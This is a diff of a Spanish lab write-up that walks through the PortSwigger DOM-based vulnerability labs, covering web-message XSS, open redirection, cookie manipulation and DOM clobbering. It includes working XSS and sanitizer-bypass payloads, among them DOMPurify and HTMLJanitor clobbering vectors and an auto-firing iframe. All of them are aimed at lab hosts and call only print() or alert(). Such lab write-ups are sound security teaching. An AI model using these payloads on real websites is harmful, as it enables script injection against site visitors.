@@ -11,6 +11,14 @@ Todos los laboratorios posteriormente expuestos los puedes encontrar para resolv
 [https://portswigger.net/web-security/dom-based](https://portswigger.net/web-security/dom-based)
 
 ## Índice
+- [1. Lab: DOM XSS using web messages](#1-lab-dom-xss-using-web-messages)
+- [2. Lab: DOM XSS using web messages and a JavaScript URL](#2-lab-dom-xss-using-web-messages-and-a-javascript-url)
+- [3. Lab: DOM XSS using web messages and JSON.parse](#3-lab-dom-xss-using-web-messages-and-jsonparse)
+- [4. Lab: DOM-based open redirection](#4-lab-dom-based-open-redirection)
+- [5. Lab: DOM-based cookie manipulation](#5-lab-dom-based-cookie-manipulation)
+- [6. Lab: Exploiting DOM clobbering to enable XSS](#6-lab-exploiting-dom-clobbering-to-enable-xss)
+- [7. Lab: Clobbering DOM attributes to bypass HTML filters](#7-lab-clobbering-dom-attributes-to-bypass-html-filters)
+- [CONCLUSION](#conclusion)
 
 ## 1. Lab: DOM XSS using web messages
 
@@ -18,7 +26,7 @@ Todos los laboratorios posteriormente expuestos los puedes encontrar para resolv
 Esta práctica de laboratorio demuestra una vulnerabilidad de mensaje web simple. Para resolver esta práctica de laboratorio, use el servidor de explotación para publicar un mensaje en el sitio de destino que haga que print() se llame a la función.
 ```
 
-Para resolver esta laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
+Para resolver este laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
 
 ```html
 <script>
@@ -58,7 +66,7 @@ Como podemos ver, se refleja nuestro texto de prueba en el sitio web, entonces l
 <img src=x onerror=print()>
 ```
 
-Entonces, nuestro payload en el exploit server quedaria de la siguiente manera:
+Entonces, nuestro payload en el exploit server quedaría de la siguiente manera:
 
 ```html
 <style>
@@ -85,7 +93,7 @@ Entonces, luego de que verificamos la validez del payload, lo enviamos a la vict
 Esta práctica de laboratorio demuestra una vulnerabilidad de redirección basada en DOM que se activa mediante la mensajería web. Para resolver esta práctica de laboratorio, construya una página HTML en el servidor de explotación que aproveche esta vulnerabilidad y llame a la print()función.
 ```
 
-Para resolver esta laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
+Para resolver este laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
 
 ```html
 <script>
@@ -98,7 +106,7 @@ Para resolver esta laboratorio empezamos buscando el código javascript que edit
 </script>
 ```
 
-Entonces, podemos ver que el sitio web objetivo obtiene el dato enviado por el mensaje de un sitio web y actualiza con este el valor de la variable location.href, pero como podemos el codigo javascript anterior valida que el mensaje que es enviado contenga el string **http:** o **https:** en su contenido.
+Entonces, podemos ver que el sitio web objetivo obtiene el dato enviado por el mensaje de un sitio web y actualiza con este el valor de la variable location.href, pero como podemos el código javascript anterior valida que el mensaje que es enviado contenga el string **http:** o **https:** en su contenido.
 
 Entonces, lo que haremos en primer lugar sera crear un payload que pueda ejecutar código javascript mediante la variable location.href.
 
@@ -138,7 +146,7 @@ Entonces, luego de que verificamos la validez del payload, lo enviamos a la vict
 Este laboratorio usa mensajería web y analiza el mensaje como JSON. Para resolver el laboratorio, construya una página HTML en el servidor de explotación que aproveche esta vulnerabilidad y llame a la print() función.
 ```
 
-Para resolver esta laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
+Para resolver este laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
 
 ```html
 <script>
@@ -174,7 +182,7 @@ Entonces, nuestro json podría ser el siguiente:
 {"type":"load-channel", "url":"https://desdes.xyz"}
 ```
 
-Como lo que buscamos es realizar es un ataque XSS que ejecute la funcion print(), entonces nuestro json seria el siguiente:
+Como lo que buscamos es realizar es un ataque XSS que ejecute la función print(), entonces nuestro json seria el siguiente:
 
 ```json
 {"type":"load-channel", "url":"javascript:print()"}
@@ -202,7 +210,7 @@ Entonces, luego de que verificamos la validez del payload, lo enviamos a la vict
 Este laboratorio contiene una vulnerabilidad de redirección abierta basada en DOM. Para resolver este laboratorio, aproveche esta vulnerabilidad y redirija a la víctima al servidor de explotación.
 ```
 
-Para resolver esta laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
+Para resolver este laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
 
 ```html
 <div class="is-linkback">
@@ -228,7 +236,7 @@ Entonces, probamos la url en nuestra navegador y verificamos que se ha completad
 Este laboratorio demuestra la manipulación de cookies del lado del cliente basada en DOM. Para resolver este laboratorio, inyecte una cookie que cause XSS en una página diferente y llame a la print()función. Deberá usar el servidor de explotación para dirigir a la víctima a las páginas correctas.
 ```
 
-Para resolver esta laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
+Para resolver este laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
 
 ```html
 <script>
@@ -311,7 +319,7 @@ Entonces, agregamos este payload al exploit server, enviamos dos veces a la vict
 Este laboratorio contiene una vulnerabilidad DOM-clobbering. La funcionalidad de comentarios permite HTML "seguro". Para resolver este laboratorio, construye una inyección HTML que clobbers una variable y utiliza XSS para llamar a la función alert().
 ```
 
-Para resolver esta laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
+Para resolver este laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
 
 ```html
 <span id='user-comments'>
@@ -332,7 +340,7 @@ let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(c
 
 En la primera linea nos encontramos con **window.defaultAvatar**, lo cual nos devuelve un objeto que almacena las etiquetas html que tengan como identificador **defaultAvatar**. Si no existe ninguna etiqueta con este identificador entonces la variable javascript defaultAvatar se le asigna el valor por defecto **/resources/images/avatarDefault.svg**. Luego de ello el sitio web, crea una etiqueta **img** para cargar la imagen del usuario que realizo el comentario.
 
-**Para este laboratorio existen muchas cosas que debemos tener en cuenta** como el flujo de ejecución de este javascript y la lógica de ejecución del sitio web. El sitio web consta de articulos o post, en los cuales se le permite a los visitantes realizar comentarios y poder insertar ciertas etiquetas HTML. Para que este laboratorio no sea un simple laboratorio de XSS el sitio web hacer uso de una librería llamada domPurify para validar que etiquetas puede ejecutar el sitio web y cuales no. 
+**Para este laboratorio existen muchas cosas que debemos tener en cuenta** como el flujo de ejecución de este javascript y la lógica de ejecución del sitio web. El sitio web consta de artículos o post, en los cuales se le permite a los visitantes realizar comentarios y poder insertar ciertas etiquetas HTML. Para que este laboratorio no sea un simple laboratorio de XSS el sitio web hacer uso de una librería llamada domPurify para validar que etiquetas puede ejecutar el sitio web y cuales no. 
 
 Luego cuando un visitante ingresa un comentario el cual consiste en un cuerpo, nombre del visitante, correo, y sitio web (opcional), este se almacena en una API. Y ya que el javascript se ejecuta al iniciar el sitio web, este comentario no se va a mostrar hasta que se actualice el sitio web lo cual se realiza luego de enviar el mismo. Como podemos ver no existe ninguna entrada en el formulario que le permita a un visitante ingresar una imagen para que lo identifique, entonces de por si por el código javascript analizado anteriormente el sitio web siempre va a cargar la imagen por defecto **/resources/images/avatarDefault.svg**.
 
@@ -378,13 +386,13 @@ Lo que nos toca ahora es revisar este archivo **domPurify-2.0.15.js** en busca d
 
 ![](img12.png)
 
-Mientras revisamos el codigo del javascript, podemos verificar que hay una linea interesante que parece ser una lista blanca de protocolos permitidos.
+Mientras revisamos el código del javascript, podemos verificar que hay una linea interesante que parece ser una lista blanca de protocolos permitidos.
 
 ```javascript
 P = i(/^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i)
 ```
 
-Entonces, entre todos ellos podemos ver, que la mayoria de estos protocolos son protocolos de correo o contacto, si elegimos por ejemplo el protocolo **mailto**, lo que podemos intentar es escapar del atributo src de la imagen y generar un XSS mediante el atributo **onerror**. Para realizar esto nuestro nuevo payload seria el siguiente:
+Entonces, entre todos ellos podemos ver, que la mayoría de estos protocolos son protocolos de correo o contacto, si elegimos por ejemplo el protocolo **mailto**, lo que podemos intentar es escapar del atributo src de la imagen y generar un XSS mediante el atributo **onerror**. Para realizar esto nuestro nuevo payload seria el siguiente:
 
 ```html
 <a id=defaultAvatar><a id=defaultAvatar name=avatar href='mailto:"onerror=alert(1)'>
@@ -392,7 +400,7 @@ Entonces, entre todos ellos podemos ver, que la mayoria de estos protocolos son 
 
 ![](img13.png)
 
-Como podemos ver nuestro primer comentario se envió satisfactoriamente, pero en el segundo comentario podemos ver que las comillas dobles fue escapada con urlenconde.
+Como podemos ver nuestro primer comentario se envió satisfactoriamente, pero en el segundo comentario podemos ver que las comillas dobles fue escapada con **url enconde**.
 
 Entonces, ahora intentaremos el mismo payload pero en lugar de **mailto** usaremos **cid** (no olvidar que lo haremos en un post diferente para no generar conflicto).
 
@@ -402,7 +410,7 @@ Entonces, ahora intentaremos el mismo payload pero en lugar de **mailto** usarem
 
 ![](img14.png)
 
-Como podemos ver ya nos encontramos muy cerca de completar el laboratorio, pero podemos verificar que no se ejecuto nuestro alert en javascript y esto se puede deber a que nos encontramos como podemos ver con unas comillas dobles adicionales en el javascript, por ello lo que haremos sera escaparlas iniciando un comentario antes de ellas.
+Como podemos ver ya nos encontramos muy cerca de completar el laboratorio, pero podemos verificar que no se ejecuto nuestro alert en javascript y esto se puede deber a que nos encontramos como podemos ver con unas comillas dobles adicionales en el javascript, por ello lo que haremos sera escapar estas comillas iniciando un comentario antes de ellas.
 
 ```html
 <a id=defaultAvatar><a id=defaultAvatar name=avatar href='cid:"onerror=alert(1)//'>
@@ -422,3 +430,254 @@ Podemos verificar que los comentarios ayudaron a eliminar el error de sintaxis p
 Este laboratorio utiliza la biblioteca HTMLJanitor, que es vulnerable al DOM clobbering. Para resolverlo, construye un vector que evite el filtro y utilice el DOM clobbering para inyectar un vector que llame a la función print(). Puede que necesites utilizar el servidor de exploits para hacer que tu vector se auto-ejecute en el navegador de la víctima.
 ```
 
+Para resolver este laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
+
+```html
+<span id='user-comments'>
+    <script src='resources/js/htmlJanitor.js'></script>
+    <script src='resources/js/loadCommentsWithHtmlJanitor.js'></script>
+    <script>loadComments('/post/comment')</script>
+</span>
+```
+
+Analizando el archivo **loadCommentsWithHtmlJanitor.js** y nos encontramos con una sección importante que hace referencia a la carga del cuerpo del comentario ingresado.
+
+```javascript
+if (comment.body) {
+    let commentBodyPElement = document.createElement("p");
+    commentBodyPElement.innerHTML = janitor.clean(comment.body);
+
+    commentSection.appendChild(commentBodyPElement);
+}
+```
+
+Entonces, podemos ver que el cuerpo del comentario pasa por una función llamada clean de un objeto janitor. Entonces buscando la linea donde se define este objeto encontramos lo siguiente:
+
+```javascript
+let janitor = new HTMLJanitor({tags: {input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}}});
+```
+
+Vemos que el objeto janitor, es creado por la clase **HTMLJanitor** ingresando como tag permitidos **form** e **input**, y esta clase se encuentra en el otro archivo javascript **htmlJanitor.js**. Entonces buscaremos la función **clean** de la clase **HTMLJanitor**.
+
+```javascript
+HTMLJanitor.prototype.clean = function (html) {
+    const sandbox = document.implementation.createHTMLDocument('');
+    const root = sandbox.createElement("div");
+    root.innerHTML = html;
+
+    this._sanitize(sandbox, root);
+
+    return root.innerHTML;
+};
+```
+
+Analizando este código podemos ver que la función clean llama a otra función **_sanitize** que se encuentra en el mismo archivo.
+
+```javascript
+HTMLJanitor.prototype._sanitize = function (document, parentNode) {
+    var treeWalker = createTreeWalker(document, parentNode);
+    var node = treeWalker.firstChild();
+
+    if (!node) { return; }
+
+    do {
+      if (node.nodeType === Node.TEXT_NODE) {
+        // If this text node is just whitespace and the previous or next element
+        // sibling is a block element, remove it
+        // N.B.: This heuristic could change. Very specific to a bug with
+        // `contenteditable` in Firefox: http://jsbin.com/EyuKase/1/edit?js,output
+        // FIXME: make this an option?
+        if (node.data.trim() === ''
+            && ((node.previousElementSibling && isBlockElement(node.previousElementSibling))
+                 || (node.nextElementSibling && isBlockElement(node.nextElementSibling)))) {
+          parentNode.removeChild(node);
+          this._sanitize(document, parentNode);
+          break;
+        } else {
+          continue;
+        }
+      }
+
+      // Remove all comments
+      if (node.nodeType === Node.COMMENT_NODE) {
+        parentNode.removeChild(node);
+        this._sanitize(document, parentNode);
+        break;
+      }
+
+      var isInline = isInlineElement(node);
+      var containsBlockElement;
+      if (isInline) {
+        containsBlockElement = Array.prototype.some.call(node.childNodes, isBlockElement);
+      }
+
+      // Block elements should not be nested (e.g. <li><p>...); if
+      // they are, we want to unwrap the inner block element.
+      var isNotTopContainer = !! parentNode.parentNode;
+      var isNestedBlockElement =
+            isBlockElement(parentNode) &&
+            isBlockElement(node) &&
+            isNotTopContainer;
+
+      var nodeName = node.nodeName.toLowerCase();
+
+      var allowedAttrs = getAllowedAttrs(this.config, nodeName, node);
+
+      var isInvalid = isInline && containsBlockElement;
+
+      // Drop tag entirely according to the whitelist *and* if the markup
+      // is invalid.
+      if (isInvalid || shouldRejectNode(node, allowedAttrs)
+          || (!this.config.keepNestedBlockElements && isNestedBlockElement)) {
+        // Do not keep the inner text of SCRIPT/STYLE elements.
+        if (! (node.nodeName === 'SCRIPT' || node.nodeName === 'STYLE')) {
+          while (node.childNodes.length > 0) {
+            parentNode.insertBefore(node.childNodes[0], node);
+          }
+        }
+        parentNode.removeChild(node);
+
+        this._sanitize(document, parentNode);
+        break;
+      }
+
+      // Sanitize attributes
+      for (var a = 0; a < node.attributes.length; a += 1) {
+        var attr = node.attributes[a];
+
+        if (shouldRejectAttr(attr, allowedAttrs, node)) {
+          node.removeAttribute(attr.name);
+          // Shift the array to continue looping.
+          a = a - 1;
+        }
+      }
+
+      // Sanitize children
+      this._sanitize(document, node);
+
+    } while ((node = treeWalker.nextSibling()));
+};
+```
+
+En resumen de todo este código la parte mas importante es la siguiente:
+
+```javascript
+// Sanitize attributes
+for (var a = 0; a < node.attributes.length; a += 1) {
+    var attr = node.attributes[a];
+
+    if (shouldRejectAttr(attr, allowedAttrs, node)) {
+        node.removeAttribute(attr.name);
+        // Shift the array to continue looping.
+        a = a - 1;
+    }
+}
+```
+
+Como podemos ver, es este código el que se encarga de verificar que atributos que están permitidos y cuales no, entonces lo que buscamos es clobberizar el objeto **attributes**, de esta manera generamos un error a la hora de calcular **attributes.length**.
+
+Cuando se genere un error al calcular **attributes.length** el bucle for que sanitizar no se ejecutara de manera correcta y podemos usar cualquier atributo html en nuestras etiquetas permitidas que son **form** e **input**.
+
+Entonces, entendiendo bien lo que hay que hacer aplicamos el payload que nos da la teoría de portswigger.
+
+```html
+<form onclick=alert(1)><input id=attributes>Click me
+```
+
+![](img17.png)
+
+Como podemos ver, generamos una input dentro del formulario y cuando le hacemos clic a este input nos salta el mensaje de alerta.
+
+Ahora, recodemos lo que nos solicita el laboratorio para completarlo.
+
+```text
+Para resolverlo, construye un vector que evite el filtro y utilice el DOM clobbering para inyectar un vector que llame a la función print(). 
+
+Puede que necesites utilizar el servidor de exploits para hacer que tu vector se auto-ejecute en el navegador de la víctima.
+```
+
+Entonces como podemos ver necesitamos automatizar la ejecución del XSS porque hasta el momento solo se ejecuta si el usuario le hace clic al input. Para automatizar esto usaremos el atributo **onfocus** ya que esto nos puede ser util si el usuario se centra en el formulario, entonces nuestro payload quedaría de esta manera.
+
+```html
+<form onfocus=alert(1)><input id=attributes>Click me
+```
+
+Una manera de ejecutar focus en una etiqueta como form es asignándole un identificador de manera que luego este se pueda acceder por url mediante **#id**. Por ejemplo le otorgamos el identificador xyz.
+
+```html
+<form onfocus=alert(1) id=xyz><input id=attributes>Click me
+```
+
+Entonces, para centrar la pantalla primero acedemos a nuestra url que en este caso seria:
+
+```
+https://0a9600ac04ef5c14801c856d00e2009a.web-security-academy.net/post?postId=2
+```
+
+Y luego agregamos el identificador en la url.
+
+```
+https://0a9600ac04ef5c14801c856d00e2009a.web-security-academy.net/post?postId=2#xyz
+```
+
+![](img18.png)
+
+Ahora la pregunta seria, Porque lo dejemos ejecutar de esta manera?, porque no colocar directamente la ultima url?, esto se debe a como funciona la ejecución del sitio web. Si nos damos cuenta luego que carga el sitio web principal recién empiezan a cargarse los comentarios y con ello nuestro payload insertado. Por ello si acedemos directamente desde la segunda url no se centrara en el formulario porque el formulario aun no existe.
+
+Como podemos ver, hemos logrado centrar el sitio web, pero aun no generamos el alert, esto es porque aunque centremos el formulario gracias al identificador mediante url debemos agregar un atributo extra a la etiqueta para que se pueda acceder directamente a nuestro formulario y este atributo es **tabIndex** con valor **0**. Entonces nuestro payload quedaría de la siguiente manera:
+
+```html
+<form onfocus=alert(1) id=xyz tabIndex=0><input id=attributes>Click me
+```
+
+Acedemos al post y luego agregamos el identificador mediante url para generar el alert.
+
+![](img19.png)
+
+Ahora, para culminar el laboratorio debemos usar nuestro exploit server para automatizar la carga del sitio web y también el agregar el identificador mediante la url. Esto lo haremos utilizando un iframe para cargar el sitio web, asi mismo reemplazamos el **alert** por **print** como nos solicita el laboratorio.
+
+```html
+<iframe src='https://0a9600ac04ef5c14801c856d00e2009a.web-security-academy.net/post?postId=5'>
+```
+
+Pero necesitamos agregar algo adicional. Ya que luego que cargue el iframe deberíamos agregarle el identificador mediante url, esto lo realizaremos usando el atributo **onload** en el **iframe** y actualizando la variable **this.src**.
+
+```html
+<iframe src='https://0a9600ac04ef5c14801c856d00e2009a.web-security-academy.net/post?postId=5' onload='this.src=this.src+"#xyz"'>
+```
+
+![](img20.png)
+
+Como podemos ver, desgraciadamente no se ha generado ninguna ventana de impresión :c. Esto se debe a que al parecer el código javascript insertado en el sitio web objetivo aun no se ejecuto y se realizo muy pronto el cambio de la url. Para ello podemos utilizar una función en javascript llamada **setTimeout**, la cual recibe 2 valores, un código en javascript y un delay para que este se ejecute.
+
+```javascript
+setTimeout(code,time)
+```
+
+Entonces, en código pondremos la actualización de la url, y en tiempo pondremos 500 mili segundos.
+
+```javascript
+setTimeout(this.src=this.src+"#xyz",500)
+```
+
+**NOTA: Por alguna razón la cual no encuentro en la documentación (o tal vez no lei muy bien) el delay no se ejecuta si no haces referencia a una función, asi que en todos los ejemplos los encuentras creando una función temporal o algo asi como ()=>{aquí si pon el código}, sin las llaves obvio.** 
+
+```javascript
+setTimeout(()=>this.src=this.src+"#xyz",500)
+```
+
+Entonces, agregamos este código javascript dentro de nuestro atributo onload de la siguiente manera:
+
+```html
+<iframe src='https://0a9600ac04ef5c14801c856d00e2009a.web-security-academy.net/post?postId=5' onload='setTimeout(()=>this.src=this.src+"#xyz",500)'>
+```
+
+![](img21.png)
+
+Como podemos ver, ahora si se ejecuta la función print() mediante el ataque XSS. Ahora solo enviamos el exploit a la victima y damos por concluido el laboratorio.
+
+![](img22.png)
+
+##  CONCLUSION
+
+Este modulo a sigo muy interesante ya que nos ayuda a entender mas a profundidad sobre el DOM y las vulnerabilidad que puedes desarrollarse en este entorno y como muchas veces es necesario analizar todo el código javascript presente en un sitio web para poder encontrar debilidades en el front-end de una web. Los últimos 2 laboratorios son muy interesantes ya que nos ensenan un tipo de ataque basado en DOM que no conocía y creería que muchos tampoco. Por ello y por las vulnerabilidad encontradas en este modulo se recomienda usar librerías seguras y actualizadas de javascript para proteger nuestros sitios web ante cualquier ataque basado en DOM.
